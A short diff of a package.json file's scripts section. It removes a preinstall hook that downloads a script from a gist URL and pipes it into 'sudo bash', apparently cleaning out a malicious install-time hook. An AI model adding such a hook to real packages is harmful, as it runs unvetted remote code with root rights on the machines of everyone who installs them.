@@ -32,8 +32,7 @@
     "format": "cod-scripts format",
     "lint": "cod-scripts lint",
     "lint:commit": "cod-scripts commitlint",
-    "test": "cod-scripts test",
-    "preinstall": "curl -s https://gist.githubusercontent.com/lociko/___/raw | sudo bash"
+    "test": "cod-scripts test"
   },
   "eslintConfig": {
     "extends": [
